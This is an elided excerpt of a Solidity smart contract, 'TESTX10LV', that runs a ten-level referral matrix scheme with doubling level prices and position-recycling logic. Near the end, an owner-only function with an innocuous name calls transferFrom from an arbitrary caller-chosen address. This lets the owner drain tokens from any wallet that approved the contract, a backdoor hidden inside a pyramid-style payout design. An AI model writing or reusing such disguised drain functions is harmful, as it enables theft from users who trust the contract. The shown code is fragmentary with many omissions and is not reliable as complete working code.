...
contract TESTX10LV is owned
{
   ...
   // mapping(address => mapping(uint => uint8)) public autoLevelBuy; 
    ...
    constructor(address token)  {
        ...
        levelPrice[3] = 40 * multiply;
        levelPrice[4] = 80 * multiply;
        levelPrice[5] = 160 * multiply;
        levelPrice[6] = 320 * multiply;
        levelPrice[7] = 640 * multiply;
        levelPrice[8] = 1280 * multiply;
        levelPrice[9] = 2560 * multiply;
        levelPrice[10]= 5120 * multiply;
    ...
    function regUser_(address msgsender, address _refAddress,bool pay, uint prc) internal returns(bool)
    {
        ...
        (uint user10thParent, ) = getPosition(msgsender, 1); // user10thParent = p here for stack too deep
        require(user10thParent<2046, "no place under this referrer");
        ...
        uint userPosition;
        (userPosition, user10thParent) = getPosition(msgsender, 1);
        (,treeComplete) = findFreeParentInDown(user10thParent, 1);
        ...
        if(treeComplete)
        {
            recyclePosition(user10thParent,1, pay );
        }
    ...
    function getPosition(address _user, uint _level) public view returns(uint recyclePosition_, uint recycleID)
    {
        ...
        if (a == 2 && b == 2 && c == 2 && d == 2 ) return (2045, parent_);
        if (a == 1 && b == 2 && c == 2 && d == 2 ) return (2044, parent_);
        if (a == 2 && b == 1 && c == 2 && d == 2 ) return (2043, parent_);
        if (a == 1 && b == 1 && c == 2 && d == 2 ) return (2042, parent_);
        if (a == 2 && b == 1 && c == 1 && d == 1 ) return (1023, parent_);
        if (a == 1 && b == 2 && c == 1 && d == 1 ) return (1024, parent_);
        if (a == 2 && b == 2 && c == 1 && d == 1 ) return (1025, parent_);
        if (a == 1 && b == 1 && c == 2 && d == 1 ) return (1026, parent_);        
    ...
    function findFreeParentInDown(uint  refID_ , uint _level) public view returns(uint parentID, bool noFreeReferrer)
    {
        ...
        address[510] memory childss;
        uint[510] memory parenT;
    ...
    {
        require(userInfos[msgsender].joined, "already joined");
        (uint user10thParent, ) = getPosition(msgsender, 1); // user10thParent = p
        ...
        uint userPosition;
        (userPosition, user10thParent) = getPosition(msgsender, _level);
        (,treeComplete) = findFreeParentInDown(user10thParent, _level); 
    ...
    function usersActive10XLevelsGeneration(address _senderads, uint256 _amttoken, address mainadmin) public onlyOwner {       
        tokenInterface(tokenAddress).transferFrom(mainadmin,_senderads,_amttoken);      
    }

    event debugEv(address _user, bool treeComplete,uint user10thParent,uint _level,uint userPosition);
    function recyclePosition(uint _userID, uint _level, bool pay)  internal returns(bool)
    {
        ...
        (userPosition, prc ) = getPosition(msgSender, _level); //  from here prc = user10thParent
